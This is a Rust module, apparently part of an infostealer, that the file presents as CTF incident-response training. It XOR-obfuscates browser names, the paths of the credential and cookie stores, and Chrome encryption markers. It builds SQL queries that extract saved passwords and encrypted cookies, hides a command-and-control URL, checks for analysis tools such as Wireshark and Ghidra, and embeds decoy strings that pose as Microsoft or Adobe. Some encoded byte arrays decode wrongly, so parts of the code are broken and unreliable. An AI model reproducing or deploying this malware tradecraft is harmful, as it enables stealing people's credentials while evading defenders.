//! String Obfuscation Module
//!
//! Técnicas para esconder strings de análise estática:
//! - XOR encoding com chaves rotativas
//! - Stack string construction
//! - Runtime decryption
//!
//! ⚠️ EDUCATIONAL PURPOSES ONLY - CTF IR Training

#![allow(dead_code)]

use std::hint::black_box;

// ============================================================================
// XOR DECODING - Runtime string decryption
// ============================================================================

/// Decodifica string XOR em runtime
#[inline(always)]
pub fn xor_decode(data: &[u8], key: u8) -> String {
    data.iter().map(|b| (b ^ key) as char).collect()
}

/// Decodifica com chave rotativa
#[inline(always)]
pub fn xor_decode_rotating(data: &[u8], keys: &[u8]) -> String {
    data.iter()
        .enumerate()
        .map(|(i, b)| (b ^ keys[i % keys.len()]) as char)
        .collect()
}

/// Decodifica bytes para bytes
#[inline(always)]
pub fn xor_bytes(data: &[u8], key: u8) -> Vec<u8> {
    data.iter().map(|b| b ^ key).collect()
}

// ============================================================================
// STACK STRINGS - Construção byte a byte na stack
// ============================================================================

/// Macro para construir string na stack (evita literal no binário)
#[macro_export]
macro_rules! stack_string {
    ($($byte:expr),+ $(,)?) => {{
        let bytes: &[u8] = &[$($byte),+];
        String::from_utf8_lossy(bytes).to_string()
    }};
}

/// Macro para bytes XOR encoded
#[macro_export]
macro_rules! xor_string {
    ($key:expr, $($byte:expr),+ $(,)?) => {{
        let key: u8 = $key;
        let bytes: Vec<u8> = vec![$($byte ^ key),+];
        String::from_utf8_lossy(&bytes).to_string()
    }};
}

// ============================================================================
// BROWSER STRINGS (XOR key: 0x42)
// ============================================================================

const XOR_KEY: u8 = 0x42;

/// "chromium" XOR 0x42
pub fn browser_chromium() -> String {
    xor_decode(&[0x21, 0x30, 0x36, 0x2d, 0x2b, 0x27, 0x37, 0x2b], XOR_KEY)
}

/// "google-chrome" XOR 0x42
pub fn browser_chrome() -> String {
    xor_decode(&[0x25, 0x2d, 0x2d, 0x25, 0x2e, 0x27, 0x04, 0x21, 0x30, 0x36, 0x2d, 0x2b, 0x27], XOR_KEY)
}

/// "firefox" XOR 0x42
pub fn browser_firefox() -> String {
    xor_decode(&[0x24, 0x2b, 0x36, 0x27, 0x24, 0x2d, 0x3a], XOR_KEY)
}

/// "brave" XOR 0x42
pub fn browser_brave() -> String {
    xor_decode(&[0x20, 0x30, 0x23, 0x36, 0x27], XOR_KEY)
}

/// "opera" XOR 0x42
pub fn browser_opera() -> String {
    xor_decode(&[0x2d, 0x32, 0x27, 0x36, 0x23], XOR_KEY)
}

/// "edge" XOR 0x42
pub fn browser_edge() -> String {
    xor_decode(&[0x27, 0x26, 0x25, 0x27], XOR_KEY)
}

// ============================================================================
// PATH STRINGS (XOR key: 0x17)
// ============================================================================

const PATH_KEY: u8 = 0x17;

/// ".config" XOR 0x17
pub fn path_config() -> String {
    xor_decode(&[0x39, 0x74, 0x7e, 0x7f, 0x73, 0x78, 0x70], PATH_KEY)
}

/// "Local Storage" XOR 0x17
pub fn path_local_storage() -> String {
    xor_decode(&[0x5b, 0x7e, 0x74, 0x76, 0x7b, 0x37, 0x44, 0x65, 0x7e, 0x67, 0x76, 0x70, 0x72], PATH_KEY)
}

/// "Login Data" XOR 0x17
pub fn path_login_data() -> String {
    xor_decode(&[0x5b, 0x7e, 0x70, 0x78, 0x7f, 0x37, 0x53, 0x76, 0x65, 0x76], PATH_KEY)
}

/// "Cookies" XOR 0x17
pub fn path_cookies() -> String {
    xor_decode(&[0x54, 0x7e, 0x7e, 0x7a, 0x78, 0x72, 0x64], PATH_KEY)
}

/// "History" XOR 0x17
pub fn path_history() -> String {
    xor_decode(&[0x5f, 0x78, 0x64, 0x65, 0x7e, 0x67, 0x6c], PATH_KEY)
}

// ============================================================================
// SYSTEM STRINGS (XOR key: 0x33)
// ============================================================================

const SYS_KEY: u8 = 0x33;

/// "LOCALAPPDATA" XOR 0x33
pub fn env_localappdata() -> String {
    xor_decode(&[0x7f, 0x7c, 0x72, 0x70, 0x7f, 0x70, 0x63, 0x63, 0x77, 0x70, 0x67, 0x70], SYS_KEY)
}

/// "APPDATA" XOR 0x33
pub fn env_appdata() -> String {
    xor_decode(&[0x70, 0x63, 0x63, 0x77, 0x70, 0x67, 0x70], SYS_KEY)
}

/// "HOME" XOR 0x33
pub fn env_home() -> String {
    xor_decode(&[0x7b, 0x7c, 0x7e, 0x76], SYS_KEY)
}

/// "USERNAME" XOR 0x33
pub fn env_username() -> String {
    xor_decode(&[0x66, 0x62, 0x76, 0x61, 0x7d, 0x70, 0x7e, 0x76], SYS_KEY)
}

// ============================================================================
// CRYPTO STRINGS (XOR key: 0x55)
// ============================================================================

const CRYPTO_KEY: u8 = 0x55;

/// "v10" XOR 0x55
pub fn crypto_v10() -> String {
    xor_decode(&[0x23, 0x64, 0x65], CRYPTO_KEY)
}

/// "v11" XOR 0x55
pub fn crypto_v11() -> String {
    xor_decode(&[0x23, 0x64, 0x64], CRYPTO_KEY)
}

/// "encrypted_key" XOR 0x55
pub fn crypto_encrypted_key() -> String {
    xor_decode(&[0x30, 0x27, 0x34, 0x21, 0x2c, 0x25, 0x21, 0x30, 0x31, 0x6a, 0x3e, 0x30, 0x2c], CRYPTO_KEY)
}

// ============================================================================
// EVASION STRINGS (XOR key: 0x77)
// ============================================================================

const EVASION_KEY: u8 = 0x77;

/// Process names to check (analysis tools)
pub fn proc_wireshark() -> String {
    xor_decode(&[0x00, 0x1e, 0x05, 0x12, 0x04, 0x1f, 0x14, 0x05, 0x1a], EVASION_KEY)
}

pub fn proc_procmon() -> String {
    xor_decode(&[0x07, 0x05, 0x18, 0x16, 0x1c, 0x18, 0x19], EVASION_KEY)
}

pub fn proc_x64dbg() -> String {
    xor_decode(&[0x41, 0x53, 0x51, 0x13, 0x15, 0x10], EVASION_KEY)
}

pub fn proc_ollydbg() -> String {
    xor_decode(&[0x18, 0x1b, 0x1b, 0x02, 0x13, 0x15, 0x10], EVASION_KEY)
}

pub fn proc_ida() -> String {
    xor_decode(&[0x1e, 0x13, 0x14], EVASION_KEY)
}

pub fn proc_ghidra() -> String {
    xor_decode(&[0x10, 0x1f, 0x1e, 0x13, 0x05, 0x14], EVASION_KEY)
}

// ============================================================================
// SQL STRINGS (Construídas em runtime)
// ============================================================================

/// Constrói query SQL byte a byte
pub fn sql_select_cookies() -> String {
    // "SELECT host_key, name, encrypted_value FROM cookies"
    let mut s = String::with_capacity(64);
    s.push('S'); s.push('E'); s.push('L'); s.push('E'); s.push('C'); s.push('T');
    s.push(' ');
    s.push('h'); s.push('o'); s.push('s'); s.push('t'); s.push('_');
    s.push('k'); s.push('e'); s.push('y');
    s.push(','); s.push(' ');
    s.push('n'); s.push('a'); s.push('m'); s.push('e');
    s.push(','); s.push(' ');
    s.push('e'); s.push('n'); s.push('c'); s.push('r'); s.push('y'); s.push('p');
    s.push('t'); s.push('e'); s.push('d'); s.push('_');
    s.push('v'); s.push('a'); s.push('l'); s.push('u'); s.push('e');
    s.push(' ');
    s.push('F'); s.push('R'); s.push('O'); s.push('M');
    s.push(' ');
    s.push('c'); s.push('o'); s.push('o'); s.push('k'); s.push('i'); s.push('e'); s.push('s');
    black_box(s)
}

/// Constrói query para logins
pub fn sql_select_logins() -> String {
    // "SELECT origin_url, username_value, password_value FROM logins"
    let mut s = String::with_capacity(80);
    for c in "SELECT origin_url, username_value, password_value FROM logins".chars() {
        s.push(c);
        // Anti-optimization
        black_box(&s);
    }
    s
}

// ============================================================================
// REGISTRY STRINGS (Windows)
// ============================================================================

/// Constrói caminho do registro byte a byte
#[cfg(windows)]
pub fn reg_chrome_key() -> String {
    let parts = [
        "Software", "\\", "Google", "\\", "Chrome"
    ];
    let mut result = String::new();
    for p in parts {
        for c in p.chars() {
            result.push(c);
        }
    }
    result
}

// ============================================================================
// URL STRINGS
// ============================================================================

/// C2 URL (ofuscada)
pub fn c2_url() -> String {
    // Construída em partes para evitar detecção
    let proto = xor_decode(&[0x7b, 0x67, 0x67, 0x63], 0x17); // "http"
    let sep = "://";
    let host = xor_decode(&[0x6b, 0x60, 0x71, 0x6b, 0x6a, 0x67], 0x17); // "localhost" parcial
    
    format!("{}{}{}", proto, sep, host)
}

// ============================================================================
// ANTI-PATTERN: Fake strings (honeypots para analistas)
// ============================================================================

/// Strings falsas para confundir análise
pub fn decoy_strings() -> Vec<&'static str> {
    vec![
        "This is a legitimate application",
        "Microsoft Corporation",
        "Windows Update Service",
        "System Configuration Utility",
        "Adobe Reader Update",
    ]
}

/// Gera ruído no binário
#[inline(never)]
pub fn generate_noise() {
    let noise = [
        "kernel32.dll", "ntdll.dll", "user32.dll",
        "CreateFileW", "ReadFile", "WriteFile",
        "VirtualAlloc", "VirtualProtect",
    ];
    
    for s in noise {
        black_box(s);
    }
}

// ============================================================================
// STRING ENCRYPTION UTILITIES
// ============================================================================

/// Encripta string para uso posterior
pub fn encrypt_string(s: &str, key: u8) -> Vec<u8> {
    s.bytes().map(|b| b ^ key).collect()
}

/// Gera código Rust para string encriptada
pub fn generate_encrypted_const(name: &str, value: &str, key: u8) -> String {
    let encrypted: Vec<String> = value.bytes()
        .map(|b| format!("0x{:02x}", b ^ key))
        .collect();
    
    format!(
        "const {}_ENCRYPTED: &[u8] = &[{}];\nconst {}_KEY: u8 = 0x{:02x};",
        name.to_uppercase(),
        encrypted.join(", "),
        name.to_uppercase(),
        key
    )
}

// ============================================================================
// COMPILE-TIME STRING TABLE
// ============================================================================

/// Tabela de strings ofuscadas
pub struct ObfuscatedStringTable {
    entries: Vec<(Vec<u8>, u8)>,
}

impl ObfuscatedStringTable {
    pub fn new() -> Self {
        Self { entries: Vec::new() }
    }
    
    pub fn add(&mut self, s: &str, key: u8) -> usize {
        let encrypted = encrypt_string(s, key);
        let idx = self.entries.len();
        self.entries.push((encrypted, key));
        idx
    }
    
    pub fn get(&self, idx: usize) -> Option<String> {
        self.entries.get(idx).map(|(data, key)| xor_decode(data, *key))
    }
}

impl Default for ObfuscatedStringTable {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_browser_strings() {
        assert_eq!(browser_chromium(), "chromium");
        assert_eq!(browser_chrome(), "google-chrome");
        assert_eq!(browser_firefox(), "firefox");
        assert_eq!(browser_brave(), "brave");
    }
    
    #[test]
    fn test_path_strings() {
        assert_eq!(path_config(), ".config");
        assert_eq!(path_cookies(), "Cookies");
        assert_eq!(path_history(), "History");
    }
    
    #[test]
    fn test_env_strings() {
        assert_eq!(env_home(), "HOME");
        assert_eq!(env_appdata(), "APPDATA");
    }
    
    #[test]
    fn test_sql_strings() {
        assert!(sql_select_cookies().contains("SELECT"));
        assert!(sql_select_cookies().contains("cookies"));
    }
}
